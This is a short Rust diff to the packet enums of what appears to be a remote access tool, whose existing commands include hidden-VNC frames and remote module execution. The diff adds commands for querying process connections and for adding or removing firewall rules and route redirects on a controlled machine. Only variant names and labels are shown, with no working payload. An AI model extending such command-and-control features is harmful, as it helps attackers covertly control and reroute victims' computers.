@@ -31,6 +31,9 @@ pub enum ServerboundPacket {
 
     HVNCFrame(Vec<u8>),
     ModuleExecutionResult(ModuleExecutionResult),
+    ProcessConnections(Process),
+    FirewallRuleResult(bool, String), // success, message
+    RouteRedirectResult(bool, String), // success, message
 }
 
 impl Packet for ServerboundPacket {
@@ -62,6 +65,9 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
             ServerboundPacket::ModuleExecutionResult(_) => "Module Execution Result",
+            ServerboundPacket::ProcessConnections(_) => "Process Connections",
+            ServerboundPacket::FirewallRuleResult(_, _) => "Firewall Rule Result",
+            ServerboundPacket::RouteRedirectResult(_, _) => "Route Redirect Result",
         }
     }
 }
@@ -198,6 +204,11 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ExecuteModule(_) => "Execute Module",
             ClientboundPacket::UnloadModule(_) => "Unload Module",
             ClientboundPacket::ListModules => "List Modules",
+            ClientboundPacket::GetProcessConnections(_) => "Get Process Connections",
+            ClientboundPacket::AddFirewallRule(_) => "Add Firewall Rule",
+            ClientboundPacket::RemoveFirewallRule(_) => "Remove Firewall Rule",
+            ClientboundPacket::AddRouteRedirect(_) => "Add Route Redirect",
+            ClientboundPacket::RemoveRouteRedirect(_) => "Remove Route Redirect",
         }
     }
 }
